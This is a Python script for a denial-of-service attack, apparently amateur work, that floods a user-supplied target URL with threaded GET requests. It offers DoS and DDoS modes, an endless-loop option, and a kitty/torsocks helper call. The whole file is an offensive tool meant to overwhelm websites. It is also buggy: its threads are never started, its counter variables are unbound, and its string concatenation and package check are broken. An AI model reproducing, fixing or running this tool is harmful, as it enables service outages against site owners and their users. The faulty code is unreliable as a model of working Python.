import argparse, requests, threading, random, logo, os, urllib.request
os.system("clear")

arg = argparse.ArgumentParser(description="Help Message!!",
                              formatter_class=argparse.ArgumentDefaultsHelpFormatter)
arg.add_argument("-a", "--atk", type=str, help="Attack type <DDoS/DoS>", required=True)
arg.add_argument("-T", "--target", type=str, help="Target Url", required=True)
arg.add_argument("-c", "--config", type=str, help="Headers Config file", required=True)
arg.add_argument("-t", "--thread", type=int, help="Amount of Thread", required=True)
arg.add_argument("-L", "--loop", type=int, help="Loop time")
arg.add_argument("--no_stop", action='store_true', help="Loop until the program doesn't stop")
per = arg.parse_args()

print(logo.logos[random.randint(0, 5)])
print("""
 -------------------------------------------------------
|                 Coded By Walker                       |
|Facebook: https://facebook.com/walker.fbi              |
|My friend's Account: https://facebook.com/RizeKishimaro|
|     ALL Right Reverse to Walker And RizeKishimaro     |
 -------------------------------------------------------


""")
r = urllib.request.urlopen(per.target).getcode()
if r != 200:
    print("Target Not Found!!")
    exit(0)

if not os.path.isfile(per.config):
    print("Config file not found!!")
    exit(0)

if per.no_stop and per.loop:
    print("Please Use only one Loop Parameter")
    exit(0)
elif per.loop:
    l = 1
    print("Loop: " + str(per.loop))
elif per.no_stop:
    l = 0
    print("None stop looping enabled!!")
else:
    print("Use -L or --no_stop to set Looping Time")
    exit(0)

if not os.path.isfile('/bin/kitty') and os.path.isfile('/bin/torsocks'):
    print("Required Packages are not found!!")
    exit(0)

if per.atk == 'DDoS':
    a = "Mode: DDoS"
    if per.no_stop:
        os.system("kitty DDoS.sh" + per.atk + " " + per.target + " " + per.config + " " + per.thread + " 1")
    else:
        os.system("kitty DDoS.sh" + per.atk + " " + per.target + " " + per.config + " " + per.thread + " " + per.loop)

elif per.atk == 'DoS':
    a = "Mode: Dos"
else:
    a = "Wrong Mode Try with DDoS or DoS, --help for more information"

print(a)
print("Target: " + per.target)
print("Headers Config file: " + per.config)

file = open(per.config)
data = file.read()
lp = 0
p = 0

def atk():
    if l == 0:
        while True:
            p = p + 1
            requests.request("GET", per.target, headers=data)
            print(str(p) + " Requests sent to " + per.target)
    else:
        while lp != per.loop:
            p = p + 1
            requests.request("GET", per.target, headers=data)
            print(str(p) + " Requests sent to " + per.target)
            lp = lp + 1

x = 0
if l == 1:
    for i in range(per.loop):
        x = x + 1
        thread = threading.Thread(target=atk)
        thread.start
        print(str(x) + " Requests sent to " + per.target)
else:
    while True:
        x = x + 1
        thread = threading.Thread(target=atk)
        thread.start
        print(str(x) + " Requests sent to " + per.target)




